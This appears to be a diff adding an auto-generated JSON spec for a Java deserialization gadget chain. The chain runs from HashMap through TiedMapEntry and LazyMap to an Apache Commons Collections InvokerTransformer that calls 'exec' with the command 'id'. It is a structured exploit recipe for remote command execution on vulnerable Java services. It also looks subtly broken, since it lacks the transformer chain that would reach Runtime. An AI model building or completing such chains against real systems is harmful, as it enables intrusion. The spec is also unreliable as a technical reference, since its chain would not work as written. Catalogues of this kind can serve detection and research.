@@ -1,0 +1,45 @@
+{
+  "chain_type": "transform_chain",
+  "root_class": "java.util.HashMap",
+  "root_trigger": "readObject→hash→hashCode→get→transform→Method.invoke",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {
+          "$ref": "link:1"
+        },
+        "key": "trigger"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": [],
+        "factory": {
+          "$ref": "link:2"
+        }
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": [
+          "[Ljava.lang.String;"
+        ],
+        "iArgs": [
+          [
+            "id"
+          ]
+        ]
+      }
+    }
+  ],
+  "sink_method": "Method.invoke",
+  "_iocd_meta": {
+    "auto_generated": true,
+    "chain_depth": 3,
+    "sink_category": "reflection"
+  }
+}
